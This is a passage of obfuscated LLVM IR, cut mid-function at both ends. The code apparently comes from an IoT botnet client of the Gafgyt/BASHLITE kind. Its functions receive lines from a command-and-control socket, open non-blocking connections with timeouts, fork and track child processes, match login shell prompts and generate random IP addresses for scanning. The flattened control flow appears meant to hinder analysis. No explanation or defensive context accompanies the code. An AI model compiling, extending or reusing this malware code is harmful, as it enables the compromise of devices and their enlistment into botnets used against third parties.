  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1848843357, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1848843357, label %6
    i32 269129752, label %11
    i32 -1000849932, label %20
    i32 1869788604, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 269129752, i32 1869788604
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -1000849932, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1848843357, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 989753476, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 989753476, label %24
    i32 255329226, label %33
    i32 55322660, label %50
    i32 -1909829412, label %51
    i32 -1750207020, label %55
    i32 792780860, label %58
    i32 1443466563, label %67
    i32 -1857101145, label %84
    i32 495098903, label %87
    i32 -473687164, label %88
    i32 1865205995, label %89
    i32 528688527, label %91
    i32 1999242919, label %96
    i32 73513580, label %101
    i32 431478532, label %103
    i32 -1680804037, label %111
    i32 -1671792103, label %112
    i32 -1233602217, label %115
    i32 -487395489, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 255329226, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 55322660, i32 1865205995
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -1909829412, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -1750207020, i32 -473687164
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 792780860, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #5, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 1443466563, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 -1857101145, i32 495098903
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -1909829412, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -473687164, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1865205995, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 528688527, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 1999242919, i32 -1233602217
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 73513580, i32 431478532
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 -487395489, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 -1680804037, i32 -1671792103
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -1233602217, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 528688527, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 -487395489, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -881179951, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -881179951, label %first
    i32 -1621173566, label %37
    i32 525553415, label %38
    i32 773521796, label %47
    i32 -1669334565, label %52
    i32 -646682202, label %57
    i32 -1023446716, label %66
    i32 -664515466, label %83
    i32 -34764332, label %90
    i32 816100010, label %91
    i32 -443515457, label %92
    i32 -773445591, label %93
    i32 1193542647, label %94
    i32 -1145467611, label %95
    i32 953826591, label %96
    i32 -1511190429, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -1621173566, i32 525553415
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1511190429, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 773521796, i32 953826591
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -1669334565, i32 1193542647
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -646682202, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -1023446716, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -664515466, i32 -443515457
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #5
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -34764332, i32 816100010
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1511190429, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -773445591, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1511190429, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1145467611, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1511190429, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 953826591, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -1511190429, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 284971940, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 284971940, label %first
    i32 22654478, label %9
    i32 825809919, label %11
    i32 -2075942547, label %19
    i32 97141639, label %26
    i32 593625967, label %36
    i32 1627629426, label %39
    i32 1488890917, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 22654478, i32 825809919
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 1488890917, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #5
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -2075942547, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 97141639, i32 1627629426
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 593625967, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -2075942547, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #5
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 1488890917, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 1063644023, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1063644023, label %11
    i32 -280476915, label %18
    i32 824161398, label %19
    i32 175614771, label %24
    i32 -645724236, label %37
    i32 -1133569397, label %50
    i32 549697908, label %63
    i32 -765443603, label %75
    i32 -651194684, label %76
    i32 945409805, label %78
    i32 -523254694, label %81
    i32 131306801, label %100
    i32 -239837996, label %101
    i32 -1155966126, label %102
    i32 1236571878, label %105
    i32 1137251350, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -280476915, i32 1236571878
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 824161398, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 175614771, i32 -651194684
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -765443603, i32 -645724236
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -765443603, i32 -1133569397
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -765443603, i32 549697908
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -765443603, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -651194684, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 945409805, i32 -523254694
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 824161398, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 131306801, i32 -239837996
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1137251350, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1155966126, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 1063644023, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1137251350, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
